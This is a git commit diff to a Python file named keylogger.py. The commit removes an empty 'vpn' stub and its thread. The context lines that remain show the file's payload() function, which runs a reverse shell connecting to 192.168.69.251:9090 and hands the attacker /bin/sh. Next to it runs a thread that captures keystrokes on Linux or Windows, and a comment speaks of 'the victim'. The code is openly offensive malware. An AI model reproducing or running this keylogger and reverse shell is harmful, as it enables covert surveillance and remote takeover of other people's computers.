fea902eb6359763264a08cd7c6b19fa561210fa2
Debangshu <114200360+Debang5hu@users.noreply.github.com>
2023-09-13 14:26:12 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -55,10 +55,6 @@ def payload():
     poison="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.69.251",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
     os.system(poison)
 
-#vpn
-def vpn():
-    #the victim have to be in the same network so that we can get into the device
-    pass
 
 
 if __name__=='__main__':
@@ -71,21 +67,20 @@ if __name__=='__main__':
         #implementing threading
         t1 = threading.Thread(target=obj.Keylogging_Linux)
         t2 = threading.Thread(target=payload)
-        t3 = threading.Thread(target=vpn)
+        
 
     else:
         #implementing threading
         t1 = threading.Thread(target=obj.keylogging_Windows)
         t2 = threading.Thread(target=payload)
-        t3 = threading.Thread(target=vpn)
+        
     
     # start the threads
     t1.start()
     t2.start()
-    t3.start()
+   
     
     # join the main thread
     t1.join()
     t2.join()
-    t3.join()
 
